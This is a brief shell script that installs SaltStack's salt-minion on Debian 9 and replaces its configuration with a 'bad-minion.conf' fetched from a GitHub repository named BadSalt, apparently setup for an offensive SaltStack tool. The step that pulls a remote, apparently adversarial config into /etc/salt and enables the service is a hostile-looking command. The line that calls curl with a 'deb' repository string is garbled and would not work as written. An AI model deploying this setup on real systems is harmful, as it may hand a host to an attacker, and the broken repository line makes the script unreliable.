wget -O - https://repo.saltstack.com/apt/debian/9/amd64/latest/SALTSTACK-GPG-KEY.pub | sudo apt-key add -
sudo curl deb http://repo.saltstack.com/apt/debian/9/amd64/latest stretch main -o /etc/apt/sources.list.d/saltstack.list
sudo apt update
sudo apt install salt-minion
# Replace with your conf, this is the default
sudo wget https://raw.githubusercontent.com/3ndG4me/BadSalt/master/bad-minion.conf -O /etc/salt/minion
sudo systemctl enable salt-minion --now

